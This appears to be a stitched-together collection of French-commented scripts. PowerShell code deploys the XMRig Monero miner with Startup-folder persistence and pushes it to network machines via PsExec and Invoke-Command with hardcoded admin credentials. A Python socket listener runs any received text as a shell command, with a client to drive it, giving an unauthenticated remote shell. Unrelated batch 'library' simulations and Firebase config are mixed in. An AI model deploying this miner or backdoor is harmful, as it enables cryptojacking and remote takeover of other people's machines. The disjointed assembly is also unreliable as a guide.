Expand-Archive -Path "$destination_path\monero_wallet.zip" -DestinationPath "$destination_path\wallet"
Expand-Archive -Path "$destination_path\xmrig.zip" -DestinationPath "$destination_path\miner"

# Configurer le mineur
$miner_config = "$destination_path\miner\config.json"
$wallet_address = "44AFF8Z8K8gQzH6F5Jxz5R8NQ2e8BHHXw7kT..."  # Remplace par l'adresse de ton wallet

# Modifier la configuration du mineur pour utiliser le wallet
(Get-Content $miner_config) -replace '"user": ".*"', "`"user`": `"$wallet_address`"" | Set-Content $miner_config

# Ajouter le mineur au démarrage automatique
$startup_folder = [System.Environment]::GetFolderPath('Startup')
$shortcut_path = "$startup_folder\xmrig.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcut_path)
$shortcut.TargetPath = "$destination_path\miner\xmrig.exe"
$shortcut.Save()

# Lancer le mineur
Start-Process "$destination_path\miner\xmrig.exe"

PsExec.exe \\MachineName -u Administrateur -p motdepasse -h powershell -ExecutionPolicy Bypass -File C:\path\to\deploy_miner.ps1

# Définir le chemin du dossier de destination sur le bureau de l'utilisateur
$userDesktop = [System.Environment]::GetFolderPath('Desktop')
$walletFolderPath = "$userDesktop\WalletFolder"

# Créer le dossier si nécessaire
if (-not (Test-Path $walletFolderPath)) {
    New-Item -Path $walletFolderPath -ItemType Directory
}

# Télécharger le wallet depuis un serveur ou copier un fichier local
$walletUrl = "https://example.com/monero_wallet.zip"  # Remplacer par le lien de téléchargement
$walletDestination = "$walletFolderPath\monero_wallet.zip"

# Télécharger le fichier du wallet
Invoke-WebRequest -Uri $walletUrl -OutFile $walletDestination

# Extraire le wallet
Expand-Archive -Path $walletDestination -DestinationPath $walletFolderPath

# Supprimer le fichier ZIP après extraction (facultatif)
Remove-Item -Path $walletDestination

# Ajouter une entrée dans Excel pour suivre le processus
$excelApp = New-Object -ComObject Excel.Application
$excelApp.Visible = $true

# Ouvrir un nouveau classeur ou utiliser un existant
$workbook = $excelApp.Workbooks.Add()
$worksheet = $workbook.Sheets.Item(1)

# Ajouter des informations sur l'exécution du processus dans Excel
$worksheet.Cells.Item(1, 1).Value = "Wallet créé"
$worksheet.Cells.Item(1, 2).Value = "Sur le bureau de l'utilisateur"
$worksheet.Cells.Item(2, 1).Value = "Date"
$worksheet.Cells.Item(2, 2).Value = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

# Sauvegarder le fichier Excel dans le dossier WalletFolder
$excelFilePath = "$walletFolderPath\wallet_creation_log.xlsx"
$workbook.SaveAs($excelFilePath)

# Fermer l'application Excel
$excelApp.Quit()

Write-Host "Wallet créé et enregistré dans le dossier : $walletFolderPath"

PsExec.exe \\MachineName -u Administrateur -p motdepasse -h powershell -ExecutionPolicy Bypass -File C:\path\to\create_wallet.ps1

# Liste des machines sur le réseau
$machines = @("Machine1", "Machine2", "Machine3")  # Remplacer par les noms de tes machines

# Exécuter le script sur chaque machine
foreach ($machine in $machines) {
    Invoke-Command -ComputerName $machine -ScriptBlock {
        # Chemin du script PowerShell
        $scriptPath = "C:\path\to\create_wallet.ps1"
        & $scriptPath
    }
}

# Dossier de logs
$logPath = "C:\TrashCan"
if (-not (Test-Path $logPath)) {
    New-Item -Path $logPath -ItemType Directory
}

# Liste noire de processus suspectés
$blacklist = @("bot.exe", "rat.exe", "suspicious_process.exe")

# Scan des processus
$badFound = $false
Get-Process | ForEach-Object {
    if ($blacklist -contains $_.Name) {
        $badFound = $true
        Add-Content "$logPath\log_$(hostname).txt" "Bot détecté : $($_.Name)"
    }
}

# Résultat binaire pour la logique IA
if ($badFound) {
    exit 1  # Bot détecté
} else {
    exit 0  # Propre
}

# Liste des IP admins à surveiller
$adminIPs = @("192.168.1.10", "192.168.1.11", "192.168.1.12")
$totalMined = 1000  # Exemple : total miné en XMR ou autre unité

# Tableau des machines valides
$validMachines = @()

foreach ($ip in $adminIPs) {
    $remoteCheck = Invoke-Command -ComputerName $ip -ScriptBlock {
        & "C:\Scripts\bot_scan.ps1"
        return $LASTEXITCODE
    }

    if ($remoteCheck -eq 0) {
        $validMachines += $ip
    }
}

# Calcul de la part
$nbValid = $validMachines.Count
if ($nbValid -gt 0) {
    $share = [Math]::Round($totalMined / $nbValid, 2)
    foreach ($ip in $validMachines) {
        Write-Output "[$ip] reçoit $share unités"
        # Ici, envoie d'une commande ou signature de transaction à chaque IP
    }
} else {
    Write-Output "Aucune machine propre détectée. Aucun partage."
}

C:\
 ├── miner\
 │    └── xmrig.exe
 ├── Scripts\
 │    ├── bot_scan.ps1
 │    └── start_miner.ps1
 ├── TrashCan\
 │    └── log_*.txt

@echo off
echo Contenu de la bibliothèque Livres :
type "\\serveur\Bibliotheque\Livres\index.csv"
echo.
echo Contenu de la bibliothèque Musique :
type "\\serveur\Bibliotheque\Musique\index.csv"
pause

@echo off
set /p nom_fichier=Nom du fichier (dans \\serveur\Bibliotheque\Livres\) :
set /p titre=Titre du livre :
set /p auteur=Auteur :
echo "%nom_fichier%;%titre%;%auteur%" >> "\\serveur\Bibliotheque\Livres\index.csv"
echo Élément ajouté à l'index des livres.
pause

@echo off
echo Bibliothèque Réseau (Simulation très basique)
echo.

if "%1"=="" goto :menu

if /I "%1"=="verifier_ip" call :verifier_ip
if /I "%1"=="afficher_index_livres" call :afficher_index_livres
goto :eof

:menu
echo verifier_ip - Affiche l'adresse IP locale (très basique)
echo afficher_index_livres - Affiche le contenu de l'index des livres (simulation)
echo.
echo Pour exécuter une fonction, utilisez : bibliotheque_reseau.bat <nom_fonction>
goto :eof

:verifier_ip
echo Adresse IP locale :
ipconfig | findstr /C:"Adresse IPv4"
goto :eof

:afficher_index_livres
echo Contenu de l'index des livres :
type "\\serveur\Bibliotheque\Livres\index.csv"
goto :eof

@echo off
REM Simulation d'une "bibliothèque" en commandes Windows (TRÈS LIMITÉE)
REM Ce script tente d'illustrer comment on pourrait organiser des "fonctions"
REM en utilisant des fichiers Batch, mais il ne constitue en aucun cas une
REM solution robuste ou complète.

REM Définition des "fonctions" (fichiers .bat séparés - pour l'organisation)
REM ----------------------------------------------------------------------

REM Fonction : Affiche l'adresse IP locale (très basique)
REM Fichier : bibliotheque\reseau\afficher_ip.bat
REM (Ce fichier doit exister et être accessible depuis ce script)
IF NOT EXIST "bibliotheque\reseau\afficher_ip.bat" (
    echo Erreur : Le fichier bibliotheque\reseau\afficher_ip.bat est manquant.
    echo Veuillez créer ce fichier avec le contenu suivant :
    echo @echo off
    echo echo Adresse IP locale :
    echo ipconfig ^| findstr /C:"Adresse IPv4"
    echo exit /b 0
    pause
    exit /b 1
)

REM Fonction : Affiche l'index des livres (simulation très basique)
REM Fichier : bibliotheque\donnees\afficher_index_livres.bat
REM (Ce fichier doit exister et être accessible)
IF NOT EXIST "bibliotheque\donnees\afficher_index_livres.bat" (
    echo Erreur : Le fichier bibliotheque\donnees\afficher_index_livres.bat est manquant.
    echo Veuillez créer ce fichier avec le contenu suivant :
    echo @echo off
    echo echo Contenu de l'index des livres :
    echo type "\serveur\Bibliotheque\Livres\index.csv"
    echo exit /b 0
    pause
    exit /b 1
)
REM Fonction : Ajoute un livre à l'index (simulation rudimentaire)
REM Fichier : bibliotheque\donnees\ajouter_livre.bat
IF NOT EXIST "bibliotheque\donnees\ajouter_livre.bat" (
    echo Erreur : Le fichier bibliotheque\donnees\ajouter_livre.bat est manquant
    echo Veuillez créer ce fichier avec le contenu suivant:
    echo @echo off
    echo set /p nom_fichier=Nom du fichier (dans \serveur\Bibliotheque\Livres\):
    echo set /p titre=Titre du livre:
    echo set /p auteur=Auteur:
    echo echo "%nom_fichier%;%titre%;%auteur%" ^>^\> "\serveur\Bibliotheque\Livres\index.csv"
    echo echo Livre ajouté à l'index.
    echo exit /b 0
    pause
    exit /b 1
)

REM Création des dossiers nécessaires (si ils n'existent pas)
IF NOT EXIST "bibliotheque\reseau" mkdir "bibliotheque\reseau"
IF NOT EXIST "bibliotheque\donnees" mkdir "bibliotheque\donnees"

REM Création du fichier index.csv (si il n'existe pas)
IF NOT EXIST "\serveur\Bibliotheque\Livres\index.csv" (
    echo Création du fichier index.csv
    echo nom_fichier;titre;auteur > "\serveur\Bibliotheque\Livres\index.csv"
)

REM Script principal (utilisant la "bibliothèque" simulée)
REM ------------------------------------------------------

echo Bibliothèque Réseau (Simulation TRÈS LIMITÉE)
echo.

echo --- Vérification d'adresse IP locale (du prompt admin - TRÈS BASIQUE) ---
call bibliotheque\reseau\afficher_ip.bat
echo (Note : Aucune vérification de localisation ou d'adresse routeur réelle)
echo.

echo --- Affichage de l'index des livres (du prompt bibliothèque) ---
call bibliotheque\donnees\afficher_index_livres.bat
echo.

echo --- Ajout d'un livre (du prompt bibliothèque - TRÈS RUDIMENTAIRE)---
call bibliotheque\donnees\ajouter_livre.bat
echo.

echo --- Le minage et le wallet ne peuvent absolument pas être gérés ainsi. ---

pause

@echo off
REM Simulation d'une "bibliothèque" en commandes Windows (TRÈS LIMITÉE)
REM Ce script illustre une organisation basique de "fonctions"
REM via des fichiers Batch, mais ne constitue pas une solution robuste.

REM Définition des "fonctions" (fichiers .bat séparés)
REM --------------------------------------------------

REM Fonction : Affiche l'adresse IP locale
REM Fichier : bibliotheque\reseau\afficher_ip.bat
IF NOT EXIST "bibliotheque\reseau\afficher_ip.bat" (
    echo Erreur : fichier bibliotheque\reseau\afficher_ip.bat manquant.
    echo Veuillez créer ce fichier avec :
    echo @echo off
    echo echo Adresse IP locale :
    echo ipconfig ^| findstr /C:"Adresse IPv4"
    echo exit /b 0
    pause
    exit /b 1
)

REM Fonction : Affiche l'index des livres
REM Fichier : bibliotheque\donnees\afficher_index_livres.bat
IF NOT EXIST "bibliotheque\donnees\afficher_index_livres.bat" (
    echo Erreur : fichier bibliotheque\donnees\afficher_index_livres.bat manquant.
    echo Veuillez créer ce fichier avec :
    echo @echo off
    echo echo Index des livres :
    echo type "\serveur\Bibliotheque\Livres\index.csv"
    echo exit /b 0
    pause
    exit /b 1
)

REM Fonction : Ajoute un livre à l'index
REM Fichier : bibliotheque\donnees\ajouter_livre.bat
IF NOT EXIST "bibliotheque\donnees\ajouter_livre.bat" (
    echo Erreur : fichier bibliotheque\donnees\ajouter_livre.bat manquant
    echo Veuillez créer ce fichier avec:
    echo @echo off
    echo set /p nom_fichier=Nom du fichier (dans \serveur\Bibliotheque\Livres\):
    echo set /p titre=Titre du livre:
    echo set /p auteur=Auteur:
    echo echo "%nom_fichier%;%titre%;%auteur%" ^>^\> "\serveur\Bibliotheque\Livres\index.csv"
    echo echo Livre ajouté.
    echo exit /b 0
    pause
    exit /b 1
)

REM Création des dossiers (si nécessaire)
IF NOT EXIST "bibliotheque\reseau" mkdir "bibliotheque\reseau"
IF NOT EXIST "bibliotheque\donnees" mkdir "bibliotheque\donnees"

REM Création de index.csv (si nécessaire)
IF NOT EXIST "\serveur\Bibliotheque\Livres\index.csv" (
    echo Création de index.csv
    echo nom_fichier;titre;auteur > "\serveur\Bibliotheque\Livres\index.csv"
)

REM Script principal (utilise la "bibliothèque" simulée)
REM --------------------------------------------------

echo Bibliothèque Réseau (Simulation LIMITÉE)
echo.

echo --- Afficher l'adresse IP ---
call bibliotheque\reseau\afficher_ip.bat
echo.

echo --- Afficher l'index des livres ---
call bibliotheque\donnees\afficher_index_livres.bat
echo.

echo --- Ajouter un livre ---
call bibliotheque\donnees\ajouter_livre.bat
echo.

pause

@echo off
REM Simulation de bibliothèque pour logiciel de gestion de cryptomonnaies en commandes Windows (TRÈS LIMITÉE)

REM Définition des "fonctions" (séquences de commandes Batch)
REM ----------------------------------------------------------------------

:afficher_aide
echo Bibliothèque pour Logiciel de Gestion de Cryptomonnaies (Simulation LIMITÉE)
echo.
echo Utilisation : %0 <fonction>
echo.
echo Fonctions disponibles :
echo   afficher_langages    - Affiche les langages de programmation recommandés
echo   afficher_biblios     - Affiche les bibliothèques cryptographiques
echo   afficher_blockchain  - Affiche les options d'interaction avec la blockchain
echo   afficher_stockage    - Affiche les options de stockage sécurisé
echo   afficher_ui          - Affiche les options d'interface utilisateur
echo   afficher_reseau      - Affiche les protocoles réseau
echo   afficher_securite    - Affiche les principes de sécurité
echo   afficher_tests       - Affiche les exigences de tests
echo   afficher_maintenance - Affiche les exigences de maintenance
echo   afficher_reglement   - Affiche les considérations réglementaires
goto :eof

:afficher_langages
echo Langages de programmation recommandés :
echo   - Python : Pour un développement rapide et une large gamme de bibliothèques.
echo   - Rust : Pour une sécurité et des performances élevées.
echo   - Java : Pour la portabilité et la robustesse.
goto :eof

:afficher_biblios
echo Bibliothèques cryptographiques recommandées :
echo   - OpenSSL
echo   - libsodium
echo   - Bibliothèques spécifiques au langage choisi.
goto :eof

:afficher_blockchain
echo Bibliothèques ou API pour interagir avec les blockchains :
echo   - Clients de nœuds complets
echo   - Bibliothèques légères
echo   - API fournies par des services tiers
goto :eof

:afficher_stockage
echo Options de stockage sécurisé :
echo   - Chiffrement du système de fichiers
echo   - Portefeuilles chiffrés avec des mots de passe
echo   - Intégration avec HSM ou TEE
goto :eof

:afficher_ui
echo Options d'interface utilisateur :
echo   - Application de bureau (Qt, Electron)
echo   - Application web (React, Angular, Vue.js)
echo   - Application mobile
goto :eof

:afficher_reseau
echo Protocoles réseau :
echo   Une compréhension approfondie des protocoles réseau des blockchains est nécessaire.
goto :eof

:afficher_securite
echo Principes de sécurité :
echo   Une expertise en sécurité informatique est essentielle.
goto :eof

:afficher_tests
echo Exigences de tests :
echo   Des tests rigoureux sont indispensables.
goto :eof

:afficher_maintenance
echo Maintenance et mises à jour :
echo   Le logiciel doit être maintenu et mis à jour régulièrement.
goto :eof

:afficher_reglement
echo Considérations réglementaires :
echo   Des réglementations peuvent s'appliquer selon la juridiction.
goto :eof

REM Logique principale du script
REM --------------------------------------------------

if "%1"=="" goto :afficher_aide

REM Appel de la "fonction" spécifiée
if /I "%1"=="afficher_langages" call :afficher_langages
if /I "%1"=="afficher_biblios" call :afficher_biblios
if /I "%1"=="afficher_blockchain" call :afficher_blockchain
if /I "%1"=="afficher_stockage" call :afficher_stockage
if /I "%1"=="afficher_ui" call :afficher_ui
if /I "%1"=="afficher_reseau" call :afficher_reseau
if /I "%1"=="afficher_securite" call :afficher_securite
if /I "%1"=="afficher_tests" call :afficher_tests
if /I "%1"=="afficher_maintenance" call :afficher_maintenance
if /I "%1"=="afficher_reglement" call :afficher_reglement

if /I "%1"=="aide" call :afficher_aide
if /I "%1"=="help" call :afficher_aide

if errorlevel 1 (
    echo La fonction "%1" n'est pas reconnue. Utilisez "%0 aide" pour obtenir de l'aide.
)

pause
exit /b 0

@echo off
REM Explication de la "Bibliothèque" en Commandes Windows et ses limites

echo Pourquoi cette "Bibliothèque" en Commandes Windows ?
echo ----------------------------------------------------------------------
echo.
echo Contexte :
echo.
echo Dans les échanges précédents, nous avons exploré la création d'un logiciel
echo de gestion de cryptomonnaies, en abordant des aspects tels que :
echo.
echo   - Les langages de programmation et bibliothèques nécessaires
echo   - Les exigences de sécurité
echo   - L'interaction avec les blockchains
echo   - La gestion des clés privées
echo   - L'interface utilisateur
echo.
echo Problème :
echo.
echo La question s'est posée de savoir comment organiser ces informations et
echo potentiellement automatiser certaines tâches à l'aide de l'invite de
echo commandes Windows.
echo.
echo Solution (TRÈS LIMITÉE) :
echo.
echo Étant donné que l'invite de commandes Windows n'est pas conçue pour le
echo développement d'applications complexes, nous avons créé une *simulation*
echo de "bibliothèque" en utilisant des fichiers Batch (.bat).
echo.
echo Cette simulation consiste en un ensemble de scripts Batch qui :
echo.
echo   - Organisent des séquences de commandes en "fonctions" appelables.
echo   - Fournissent une aide rudimentaire.
echo   - Tentent d'illustrer les étapes de développement d'un logiciel crypto.
echo.
echo Pourquoi en Commandes Windows ?
echo.
echo   - Pour illustrer les capacités et les limitations de l'invite de commandes.
echo   - Pour fournir un exemple *très* basique d'organisation de code.
echo   - Pour répondre à la demande de voir une solution en "code Windows Command".
echo.
echo Limitations CRUCIALES :
echo.
echo   - Ceci n'est PAS une véritable bibliothèque logicielle.
echo   - Les fonctionnalités sont extrêmement limitées.
echo   - La sécurité est inexistante.
echo   - Aucune gestion de cryptomonnaies n'est possible avec cette approche.
echo   - Les performances sont médiocres.
echo   - La maintenance serait très difficile.
echo.
echo Conclusion :
echo.
echo Cette "bibliothèque" en commandes Windows est un exercice purement
echo illustratif. Pour créer un logiciel de gestion de cryptomonnaies réel,
echo il est indispensable d'utiliser des langages de programmation et des
echo outils de développement appropriés.
echo.
pause
exit /b 0

import socket
import subprocess

def handle_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur: {e}"

HOST = '0.0.0.0'  # écoute sur toutes les interfaces
PORT = 8081       # port d'écoute

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((HOST, PORT))
    server.listen()
    print(f"[Passerelle] En écoute sur {HOST}:{PORT}")

    while True:
        conn, addr = server.accept()
        with conn:
            print(f"[Signal reçu de] {addr}")
            data = conn.recv(1024).decode()
            if not data:
                continue
            response = handle_cmd(data)
            conn.sendall(response.encode())
import socket

HOST = '192.168.1.12'  # IP de la machine passerelle
PORT = 8081

while True:
    signal = input("Commande à envoyer > ")
    if signal.lower() == "exit":
        break

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(signal.encode())
        data = s.recv(4096)
        print(f"[Réponse CMD] {data.decode()}")
firebase init apphosting
# Settings for Cloud Run
runConfig:
  minInstances: 2
  maxInstances: 100
  concurrency: 100
  cpu: 2
  memoryMiB: 1024

# Environment variables and secrets
env:
  - variable: STORAGE_BUCKET
    value: mybucket.firebasestorage.app
    availability:
      - BUILD
      - RUNTIME

  - variable: API_KEY
    secret: myApiKeySecret

    # Same as API_KEY above but with a pinned version.
  - variable: PINNED_API_KEY
    secret: myApiKeySecret@5

    # Same as API_KEY above but with the long form secret reference as defined by Cloud Secret Manager.
  - variable: VERBOSE_API_KEY
    secret: projects/test-project/secrets/secretID

    # Same as API_KEY above but with the long form secret reference with pinned version.
  - variable: PINNED_VERBOSE_API_KEY
    secret: projects/test-project/secrets/secretID/versions/5
env:
-   variable: STORAGE_BUCKET
    value: mybucket.firebasestorage.app
env:
-   variable: NEXT_PUBLIC_STORAGE_BUCKET
    value: mybucket.firebasestorage.app
    availability:
    -   BUILD
    -   RUNTIME

